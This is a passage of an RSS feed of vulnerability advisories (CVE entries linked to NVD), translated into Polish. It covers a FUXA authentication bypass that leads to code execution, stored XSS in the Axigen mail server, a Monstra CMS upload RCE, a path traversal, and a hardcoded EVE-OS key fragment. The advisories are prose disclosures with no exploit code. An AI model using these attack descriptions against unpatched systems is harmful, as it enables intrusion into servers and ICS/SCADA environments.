Migration Operation Handler.Manipulowanie argumentem boardId prowadzi do nieprawidłowej kontroli dostępu.Atak jest możliwy do przeprowadzenia zdalnie.Aktualizacja do wersji 8.21 rozwiązuje ten problem.Identyfikator poprawki to cc35dafef57ef6e44a514a523f9a8d891e74ad8f.Zalecana jest aktualizacja komponentu, którego dotyczy problem.</description></item><item><title>CVE-2026-25893</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25893</link><pubDate>Thu, 05 Feb 2026 00:27:53 +0000</pubDate><description>### Uwaga
+GitHub błędnie stwierdził, że ta luka jest identyczna z luką CVE-2025-69970, która opisuje fakt, że uwierzytelnianie jest domyślnie wyłączone.W tym poradniku opisano łańcuch exploitów, który umożliwia obejście uwierzytelniania poprzez punkt końcowy odświeżania pulsu, gdy włączone jest uwierzytelnianie.Wprowadza to użytkowników w błąd, myśląc, że włączenie uwierzytelniania załagodzi tę lukę.Więcej informacji można znaleźć w łatce: https://github.com/frangoteam/FUXA/commit/fe82348d160904d0013b9a3e267d50158f5c7afb.
+
+### Opis
+Luka w zabezpieczeniach FUXA umożliwiająca obejście uwierzytelniania umożliwia nieuwierzytelnionemu zdalnemu atakującemu uzyskanie dostępu administracyjnego za pośrednictwem interfejsu API odświeżania pulsu i wykonanie dowolnego kodu na serwerze.Dotyczy to FUXA do wersji 1.2.9, gdy włączone jest uwierzytelnianie.Ten problem został naprawiony w wersji FUXA 1.2.10.
+
+### Wpływ
+Dotyczy to wdrożeń, w których parametr „runtime.settings.secureEnabled” ma wartość „true”.
+
+Eksploatacja umożliwia nieuwierzytelnionemu zdalnemu atakującemu ominięcie wszystkich mechanizmów uwierzytelniania i uzyskanie dostępu administracyjnego do instancji FUXA poprzez utworzenie administratorskich tokenów JWT za pośrednictwem punktu końcowego odświeżania pulsu.Dzięki tym podwyższonym uprawnieniom osoba atakująca może wchodzić w interakcję z administracyjnymi interfejsami API, w tym z funkcjami przeznaczonymi do automatyzacji i tworzenia skryptów, w celu wykonania dowolnego kodu w kontekście usługi FUXA.W zależności od konfiguracji wdrożenia i uprawnień może to prowadzić do pełnego naruszenia bezpieczeństwa systemu i jeszcze bardziej narazić podłączone środowiska ICS/SCADA na dalsze działania.
+
+### Poprawki
+Ten problem został naprawiony w wersji FUXA 1.2.10.Zdecydowanie zachęca się użytkowników do aktualizacji do najnowszej dostępnej wersji.</description></item><item><title>CVE-2025-68643</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-68643</link><pubDate>Thu, 05 Feb 2026 00:00:00 +0000</pubDate><description>Serwer pocztowy Axigen w wersji wcześniejszej niż 10.5.57 umożliwia przechowywanie skryptów krzyżowych (XSS) w obsłudze parametru preferencji konta timeFormat.Atakujący mogą to wykorzystać, przeprowadzając atak wieloetapowy.Na pierwszym etapie do preferencji timeFormat wstrzykiwany jest szkodliwy ładunek JavaScript, wykorzystując osobną lukę w zabezpieczeniach lub przejęte dane uwierzytelniające.W drugim etapie, gdy ofiara loguje się do interfejsu WebMail, niezaczyszczona wartość timeFormat jest ładowana z pamięci i wstawiana do modelu DOM, powodując wykonanie wstrzykniętego skryptu.</description></item><item><title>CVE-2025-69906</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69906</link><pubDate>Thu, 05 Feb 2026 00:00:00 +0000</pubDate><description>Monstra CMS v3.0.4 zawiera lukę w zabezpieczeniach umożliwiającą przesyłanie plików we wtyczce Files Manager.Aplikacja opiera się na sprawdzaniu rozszerzeń plików w oparciu o czarną listę i przechowuje przesłane pliki bezpośrednio w katalogu dostępnym w Internecie.W typowych konfiguracjach serwerów może to umożliwić osobie atakującej przesłanie plików interpretowanych jako kod wykonywalny, co skutkuje zdalnym wykonaniem kodu.</description></item><item><title>CVE-2025-69619</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69619</link><pubDate>Thu, 05 Feb 2026 00:00:00 +0000</pubDate><description>Przekroczenie ścieżki w My Text Editor v1.6.2 umożliwia atakującym wywołanie ataku typu „odmowa usługi” (DoS) poprzez zapisanie plików w pamięci wewnętrznej.</description></item><item><title>CVE-2023-43637</title><link>https://nvd.nist.gov/vuln/detail/CVE-2023-43637</link><pubDate>Wed, 04 Feb 2026 23:21:25 +0000</pubDate><description>### Wpływ
 
 Funkcja pochodnejVaultKey wywołuje funkcję retrieveCloudKey, która zawsze zwraca wartość „foobarfoobarfoobarfoobarfoobarfo”.Po połączeniu z losowo wygenerowanym 32-bajtowym kluczem za pomocą mergeKeys (16 bajtów z każdego), ostatnie 16 bajtów to zawsze „arfoobarfoobarfo”.Dzięki temu osoba atakująca posiadająca fizyczny dostęp do urządzenia z systemem EVE-OS może podjąć próbę złamania pozostałych 128 bitów klucza metodą brute-force.
 
